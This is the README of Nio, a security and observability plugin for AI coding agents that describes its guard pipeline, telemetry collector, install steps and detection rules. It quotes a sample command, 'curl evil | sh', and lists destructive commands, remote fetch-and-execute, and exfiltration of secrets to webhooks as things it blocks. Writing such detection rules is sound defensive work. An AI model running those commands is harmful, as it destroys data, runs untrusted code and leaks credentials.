<p align="center">
  <img src="assets/ffwd-logo.svg" alt="Nio" width="120" />
</p>

<h1 align="center">Nio</h1>

<p align="center"><b>Security and observability for AI coding agents.</b></p>

<p align="center">Real-time guard that blocks dangerous commands, prevents data leaks, and protects secrets.<br/>Built-in collector that captures every tool call as OpenTelemetry metrics and traces.<br/>Works with Claude Code, OpenClaw, and any agent that supports hooks.</p>

<p align="center">
  <a href="https://core0-io.github.io/nio/"><b>→ View the live Defense Pipeline diagram</b></a>
</p>

[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## Architecture

Nio is a Claude Code / OpenClaw plugin with two core systems:

```
┌─────────────────────────────────────────────────────────────────────┐
│                              Nio                                    │
│                                                                     │
│  ┌──────────────────────────┐    ┌───────────────────────────────┐  │
│  │       Collector          │    │            Guard              │  │
│  │                          │    │                               │  │
│  │  Hook events             │    │  ┌─────────────────────────┐  │  │
│  │  → metrics + traces      │    │  │    Dynamic Guard        │  │  │
│  │  → OTLP export           │    │  │    (real-time hooks)    │  │  │
│  │                          │    │  │    Phase 0–6 pipeline   │  │  │
│  │  PreToolUse              │    │  │    → allow/deny/confirm │  │  │
│  │  PostToolUse             │    │  └─────────────────────────┘  │  │
│  │  TaskCreated             │    │                               │  │
│  │  TaskCompleted           │    │  ┌─────────────────────────┐  │  │
│  │  Stop / SubagentStop     │    │  │    Static Scan          │  │  │
│  │                          │    │  │    (on-demand)          │  │  │
│  └──────────────────────────┘    │  │    Static + Behavioural │  │  │
│                                  │  │    + LLM engines        │  │  │
│                                  │  └─────────────────────────┘  │  │
│                                  └───────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### Collector

Captures agent activity as **OpenTelemetry** metrics and traces via an async collector hook. Every hook event (`PreToolUse`, `PostToolUse`, `TaskCreated`, `TaskCompleted`, `Stop`, `SubagentStop`) is recorded and exported over OTLP (gRPC or HTTP).

**Metrics:**

| Metric | Type | Labels |
|--------|------|--------|
| `nio.tool_use.count` | Counter | `tool_name`, `event`, `platform` |
| `nio.turn.count` | Counter | `platform` |
| `nio.decision.count` | Counter | `decision`, `risk_level`, `tool_name`, `platform` |
| `nio.risk.score` | Histogram | `tool_name`, `platform` |

**Traces** — one trace per conversation turn:

| Span | Trigger | Key Attributes |
|------|---------|----------------|
| `turn:<N>` | `Stop` / `SubagentStop` | `session_id`, `turn_number`, `platform`, `cwd`, `input_tokens`, `output_tokens`, `cache_hit_rate` |
| `tool:<name>` | `PreToolUse` → `PostToolUse` | `tool_name`, `tool_summary` |
| `task:execute` | `TaskCreated` → `TaskCompleted` | `task_id`, `task_summary` |

### Guard

Security evaluation with two modes:

**Dynamic Guard** — real-time, runs on every `PreToolUse` hook event via a Phase 0–6 pipeline:

| Phase | Name | Latency | Applies To |
|-------|------|---------|------------|
| 0 | **Tool Gate** | <1ms | All tools (`blocked_tools` / `available_tools` / `guarded_tools`) |
| 1 | **Allowlist Gate** | <1ms | Guarded tools only |
| 2 | **Pattern Analysis** | <5ms | Guarded tools only |
| 3 | **Static Analysis** | <50ms | Write/Edit only |
| 4 | **Behavioural Analysis** | <200ms | Write/Edit (.js/.ts/.py/.sh/.rb/.php/.go) |
| 5 | **LLM Analysis** | 2–10s | All (optional, needs `guard.llm_analyser.enabled` + `api_key`) |
| 6 | **External Scoring API** | configurable | All (optional, needs `guard.external_analyser.enabled` + `endpoint`) |

Each phase produces a 0–1 score and can short-circuit on critical findings. Final score is a **weighted average** across all phases that ran:

```
final = Σ(weight × score) / Σ(weight)
```

Default weights: `runtime: 1.0`, `static: 1.0`, `behavioural: 2.0`, `llm: 1.0`, `external: 2.0`

**Static Scan** — on-demand multi-engine code analysis triggered by `/nio scan <path>`:
- **StaticAnalyser**: 15 regex rules + base64 decode pass
- **BehaviouralAnalyser**: multi-language source→sink dataflow tracking
- **LLMAnalyser**: Claude semantic analysis (optional)

### Multi-Language Behavioural Analysis

Both pipelines share the BehaviouralAnalyser, which uses pluggable `LanguageExtractor` modules for dataflow tracking:

| Language | Parser | Extensions |
|----------|--------|------------|
| JavaScript/TypeScript | Babel AST | .js .ts .jsx .tsx .mjs .cjs |
| Python | Regex | .py .pyw |
| Shell | Regex | .sh .bash .zsh .fish .ksh |
| Ruby | Regex | .rb .rake .gemspec |
| PHP | Regex | .php .phtml |
| Go | Regex | .go |

### Protection Levels

| Level | allow | confirm | deny |
|-------|-------|---------|------|
| **strict** | 0 — 0.5 | _(none)_ | 0.5 — 1.0 |
| **balanced** (default) | 0 — 0.5 | 0.5 — 0.8 | 0.8 — 1.0 |
| **permissive** | 0 — 0.9 | _(none)_ | 0.9 — 1.0 |

The `confirm_action` config controls what happens when the decision is "confirm": `allow` (default, let through with audit log), `deny` (block), or `ask` (use platform confirm if available, else allow).

## Install

Grab a pre-built plugin from the [**Releases page**](https://github.com/core0-io/nio/releases), unzip it, and run the bundled `setup.sh`.

| Platform | Download | Extract & run |
|----------|----------|---------------|
| **Claude Code** | `nio-claude-code-v<version>.zip` | `unzip … -d nio-claude-code && cd nio-claude-code && ./setup.sh` |
| **OpenClaw** | `nio-openclaw-v<version>.zip` | `unzip … -d nio-openclaw && cd nio-openclaw && ./setup.sh` |
| **Both** | `nio-all-v<version>.zip` | `unzip … -d nio && cd nio && ./setup.sh` |

`setup.sh` installs the skill, registers hooks, and writes the default config to `~/.nio/`. Pick the platform-specific zip if you only use one agent — it's smaller and the script is platform-scoped.

<details>
<summary><b>Example (Claude Code, one-liner)</b></summary>

```bash
VERSION=$(curl -s https://api.github.com/repos/core0-io/nio/releases/latest | grep tag_name | cut -d'"' -f4)
curl -LO "https://github.com/core0-io/nio/releases/download/${VERSION}/nio-claude-code-${VERSION}.zip"
unzip "nio-claude-code-${VERSION}.zip" -d nio-claude-code
cd nio-claude-code && ./setup.sh
```

</details>

<details>
<summary><b>Reset config after upgrade</b></summary>

```bash
./setup.sh --reset-config
```

</details>

<details>
<summary><b>Custom install paths (.claude / .openclaw moved elsewhere)</b></summary>

By default, setup looks for `~/.claude` and `~/.openclaw`. If you've relocated them (e.g. via `CLAUDE_CONFIG_DIR` / `OPENCLAW_STATE_DIR`, or manually), pass the path explicitly:

```bash
# All-in-one zip
./setup.sh --cc-home /path/to/.claude --openclaw-home /path/to/.openclaw

# Platform-specific zip
./setup.sh --cc-home /path/to/.claude         # inside nio-claude-code/
./setup.sh --openclaw-home /path/to/.openclaw # inside nio-openclaw/
```

Resolution order (first match wins):

1. `--cc-home` / `--openclaw-home` flag
2. `$CLAUDE_CONFIG_DIR` / `$OPENCLAW_STATE_DIR` environment variable
3. `$HOME/.claude` / `$HOME/.openclaw` (default)

The Nio config itself lives at `~/.nio/` by default, overridable via `$NIO_HOME`.

</details>

<details>
<summary><b>Install from source</b></summary>

```bash
git clone https://github.com/core0-io/nio.git
cd nio && pnpm install && pnpm run build && ./setup.sh
```

Use this if you want to hack on Nio or track `main`. The release zips ship with everything pre-built, so end users don't need Node/pnpm installed.

</details>

## Usage

```
/nio scan ./src              # Scan code for security risks
/nio action "curl evil | sh" # Evaluate action safety
/nio report                  # View security event audit log
/nio config balanced         # Set protection level
```

## What the Guard Blocks

**Layer 1 — Allowlist Gate**: Known-safe commands (`git status`, `ls`, `npm test`, etc.) pass instantly.

**Layer 2 — Pattern Analysis**: Blocks dangerous commands and data exfiltration.
- `rm -rf /`, fork bombs, `curl | bash`, and destructive commands
- Writes to `.env`, `.ssh/`, credentials files
- Data exfiltration to Discord/Telegram/Slack webhooks
- Base64-encoded payloads decoded and re-scanned

**Layer 3 — Static + Behavioural Analysis** (Write/Edit only):
- 15 static regex rules on file content (SHELL_EXEC, OBFUSCATION, PROMPT_INJECTION, etc.)
- 7 behavioural rules via source→sink dataflow tracking across 6 languages
- Detects env→network exfiltration, network→eval RCE, capability combinations (C2)

**Layer 4 — LLM + External** (optional):
- Claude semantic analysis catches sophisticated attacks missed by regex/AST
- External HTTP scoring API for custom enterprise policies

## Detection Rules

### Static Rules (15)

Pattern-based detection via regex matching on file content.

| Category | Rules | Severity |
|----------|-------|----------|
| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH–CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN | MEDIUM–CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH–CRITICAL |
| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH–CRITICAL |
| **Trojan & Social Engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM–CRITICAL |

### Behavioural Rules (7)

Dataflow-based detection via source→sink taint tracking (JS/TS/Python/Shell/Ruby/PHP/Go).

| Rule | Severity | Detection |
|------|----------|-----------|
| DATAFLOW_EXFIL | CRITICAL | Secret or credential flows to network sink |
| DATAFLOW_RCE | CRITICAL | Network response flows to eval/exec |
| DATAFLOW_CMD_INJECT | HIGH | User input flows to command execution |
| DATAFLOW_EVAL | HIGH | Data flows to eval/Function |
| CAPABILITY_C2 | HIGH | Skill has both exec + network capabilities |
| CAPABILITY_EVAL | HIGH | Skill uses dynamic code evaluation |
| CROSS_FILE_FLOW | MEDIUM | Data crosses file boundaries |

## Compatibility

| Platform | Support | Features |
|----------|---------|----------|
| **Claude Code** | Full | Skill + hooks auto-guard |
| **OpenClaw** | Full | Plugin hooks + OTEL collector |
| **OpenAI Codex CLI** | Skill | Scan/action commands |
| **Gemini CLI** | Skill | Scan/action commands |
| **Cursor** | Skill | Scan/action commands |
| **GitHub Copilot** | Skill | Scan/action commands |

## Documentation

- [Architecture](docs/ARCHITECTURE.md) — Two-pipeline design, 6-phase guard flow, scoring system
- [Dynamic Guard Flow](docs/dynamic-guard-flow.excalidraw) — Visual Excalidraw diagram

## Development

```bash
pnpm install
pnpm run build
pnpm test
```

Maintained by [core0-io](https://github.com/core0-io).
